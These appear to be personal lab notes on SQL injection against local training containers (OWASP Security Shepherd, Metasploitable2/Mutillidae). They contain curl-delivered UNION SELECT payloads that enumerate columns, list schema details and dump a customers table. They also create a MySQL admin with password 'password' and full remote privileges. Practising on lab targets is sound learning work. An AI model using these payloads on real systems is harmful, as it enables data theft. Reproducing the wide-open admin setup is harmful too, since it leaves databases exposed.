# SQL Injection

### Describe table columns
First the one need to find how many columns there are in the table
```bash
php -a
# check if the table has four columns
echo rawurlencode(' union select 1,2,3,4');

# At another tab
curl 10.0.0.3?id="1%20union%20select%201%2C2%2C3%2C4"
# if the curl does not return error, then, the table has four columns

```
### General examples
```bash
php -a

echo rawurlencode(' UNION SELECT 1,column_name,column_type,4 FROM information_schema.columns WHERE table_name="customers" -- ');

echo rawurlencode(' UNION SELECT * FROM customers -- ');

# At another cli tab
curl 10.0.0.3?id="1"

curl 10.0.0.3?id="1%20UNION%20SELECT%201%2Ccolumn_name%2Ccolumn_type%2C4%20FROM%20information_schema.columns%20WHERE%20table_name%3D%22customers%22%20--%20"

curl 10.0.0.3?id="1%20UNION%20SELECT%20%2A%20FROM%20customers%20--%20"

```
### Config owasp container
```bash
owasp:
  image: owasp/security-shepherd
  container_name: owasp
  ports:
      - 83:8443
  networks:
      kali-app-network:
          ipv4_address: 10.0.0.5

docker exec -it -u 0 owasp bash

netstat -tlp
cat /usr/local/tomcat/conf/Security file && echo;

exit

docker exec -it -u 0 ubuntu bash
./startServices
mysql -u root -p
CREATE USER 'admin'@'%' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON *.* TO 'admin'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;
EXIT;

localhost:83
```
### Metasploitable2
```bash
metasploitable2:
  image: tleemcjr/metasploitable2
  tty: true
  container_name: metasploitable2
  ports:
      - 83:80
  volumes:
      - ./:/home/gustavo
  networks:
      kali-app-network:
          ipv4_address: 10.0.0.6
docker exec -it -u 0 metasploitable2 sh
nano /var/www/mutillidae/config.inc
netstat -tlp | grep mysql
```
### Metasploitable2 Create DB
```bash
mysql -u root -p # no pass
show databases;
use metasploit;
source /home/gustavo/users.sql;
LOAD DATA INFILE '/home/gustavo/users.txt' into table accounts FIELDS TERMINATED BY ',' LINES TERMINATED BY '\n';
select * from accounts;
```
### Metasploitable2 users.txt
```
gustavo,gustavo\n
test,test\n
```
### Metasploitable2 users.sql
```
CREATE TABLE accounts (
    id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(100) NOT NULL,
    password VARCHAR(100) NOT NULL
);
```
### Metasploitable2 Injections
```
' union select 1,2,3 #
' union select database(),user(),version() #
# same as
select database(); # at mysql terminal
```
